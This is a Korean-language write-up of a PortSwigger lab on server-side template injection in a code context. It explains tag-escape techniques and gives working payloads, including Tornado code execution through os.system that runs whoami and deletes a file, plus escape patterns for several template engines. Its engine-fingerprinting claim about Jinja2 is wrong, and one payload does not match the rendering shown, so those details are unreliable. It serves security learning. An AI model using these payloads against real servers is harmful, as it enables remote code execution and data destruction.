# Lab: Basic server-side template injection (code context)

## 개요

- **난이도**: Apprentice
- **주제**: Server-Side Template Injection — 코드 컨텍스트 내 주입 / 태그 탈출
- **링크**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

## 이전 랩(001)과의 차이

```
[001 — 텍스트 컨텍스트 주입]
  서버 코드:  render("Hello, " + user_input)
  입력값이 템플릿 문자열 바깥(텍스트 영역)에 삽입됨
  → <%= 7*7 %> 를 그대로 삽입하면 동작

[002 (이번) — 코드 컨텍스트 주입]
  서버 코드:  render("Hello, {{ user.name }}")
                              ↑
              입력값이 이미 {{ }} 태그 안에 위치
  → {{ }} 안에 있으므로 태그를 먼저 닫아야 함
```

## 코드 컨텍스트 주입 원리

### 취약 지점

서버에서 사용자의 `preferred_name` 설정값을 템플릿에 삽입:

```python
# 서버 내부 (추정)
template = f"Hello, {{ user.{preferred_name} }}"
result = render(template)
```

기본 상태:
```
preferred_name = "name"
템플릿:          Hello, {{ user.name }}
렌더링 결과:     Hello, Alice
```

### 주입이 {{ }} 안에 있는 경우

단순히 `{{ 7*7 }}` 를 삽입하면:
```
preferred_name = "name }}{{ 7*7 }}"
→ 아무 변화 없거나 에러
```

올바른 접근 — 기존 태그를 먼저 닫기:

```
preferred_name = "name}}{{ 7*7 }}{{"
→ 템플릿: Hello, {{ user.name}}{{ 7*7 }}{{  }}
→ 렌더링: Hello, Alice49
```

## 공격 단계

### 1단계 — 코드 컨텍스트 확인

계정 설정에서 `preferred_name` 파라미터에 수식 삽입:

```
preferred_name=user.name}}{{7*7}}
```

서버 렌더링:
```
Hello, {{ user.name}}{{7*7}} }}
                        ↑
                    49 출력 → SSTI 확인
```

### 2단계 — 엔진 식별

응답 패턴으로 Tornado(Python) 템플릿 엔진 확인:
```
{{7*'7'}} → 7777777   (Jinja2 아님)
{{7*7}}   → 49        (Tornado, Jinja2 등)
```

### 3단계 — RCE

Tornado 템플릿 엔진의 Python 코드 실행:

```
preferred_name=name}}{%import os%}{{os.system('whoami')
```

또는 파일 삭제:

```
preferred_name=name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')
```

서버 렌더링:
```
Hello, {{ user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt') }}
→ 파일 삭제 실행
```

## 컨텍스트별 주입 패턴 비교

### 텍스트 컨텍스트

```
[서버 코드]
  "Hello, " + user_input

[주입]
  user_input = "{{ 7*7 }}"

[렌더링]
  "Hello, {{ 7*7 }}"  →  "Hello, 49"
```

### 코드 컨텍스트

```
[서버 코드]
  "Hello, {{ user." + preferred_name + " }}"

[주입 — 닫는 태그로 탈출]
  preferred_name = "name }}{{ 7*7 }}{{"

[렌더링]
  "Hello, {{ user.name }}{{ 7*7 }}{{  }}"
  → "Hello, Alice49"

핵심: 기존 }} 로 먼저 탈출, 이후 새 {{ }} 로 페이로드 삽입
```

## 엔진별 코드 컨텍스트 탈출 패턴

```
[Jinja2 / Tornado — Python]
  컨텍스트:  {{ user.name }}
  탈출:      }}{{ 7*7 }}{{
  최종:      {{ user.name}}{{ 7*7 }}{{ }}

[Twig — PHP]
  컨텍스트:  {{ user.name }}
  탈출:      }}{{ 7*7 }}{{
  최종:      {{ user.name}}{{ 7*7 }}{{ }}

[ERB — Ruby]
  컨텍스트:  <%= user.name %>
  탈출:      %><%= 7*7 %><%=
  최종:      <%= user.name%><%= 7*7 %><%= %>

[Freemarker — Java]
  컨텍스트:  ${user.name}
  탈출:      }${7*7}${
  최종:      ${user.name}${7*7}${}
```

## 탐지 시 주의사항

```
[텍스트 컨텍스트 탐지]
  {{ 7*7 }} 삽입 → 49 출력 여부 확인

[코드 컨텍스트 탐지]
  {{ 7*7 }} → 에러 또는 변화 없음  (태그 안에 있어서)
  }} {{ 7*7 }} → 에러 또는 변화 없음
  }} {{7*7}} {{ → 49 출력 → 코드 컨텍스트 SSTI 확인

→ 탐지가 실패하면 컨텍스트를 의심하고 탈출 시도
```

## 핵심 정리

- 코드 컨텍스트 SSTI 는 입력값이 이미 `{{ }}` 같은 템플릿 태그 안에 있을 때 발생한다.
- 탈출 기법: 기존 태그를 먼저 `}}` 로 닫고, 새 `{{ }}` 로 페이로드를 삽입한 뒤 여는 태그 `{{` 로 구문 오류를 방지한다.
- 텍스트 컨텍스트에서 탐지 실패 시 코드 컨텍스트일 가능성을 고려해 탈출 패턴을 시도해야 한다.

## 배운 점

### 코드 컨텍스트 탈출 공식

```
[원래 템플릿]
  {{ user.INJECTION_POINT }}

[탈출 페이로드]
  INJECTION_POINT = "name}}PAYLOAD{{"

[결과 템플릿]
  {{ user.name}}PAYLOAD{{ }}
                ↑
        PAYLOAD 가 템플릿 코드로 실행됨

공식:
  닫는 태그 + 페이로드 + 여는 태그
  }}        + PAYLOAD + {{
```

### SQL Injection 과의 유사성

```
[SQL Injection — 문자열 컨텍스트 탈출]
  WHERE id = 'INJECTION'
  공격:  ' OR 1=1 --
  결과:  WHERE id = '' OR 1=1 --'
         ↑ 따옴표로 문자열 닫고 탈출

[SSTI — 코드 컨텍스트 탈출]
  {{ user.INJECTION }}
  공격:  name}}{{ 7*7 }}{{
  결과:  {{ user.name}}{{ 7*7 }}{{ }}
         ↑ }} 로 태그 닫고 탈출

공통 원칙:
  현재 컨텍스트를 닫는 구문 + 실행할 코드 + 뒷부분 정리
```
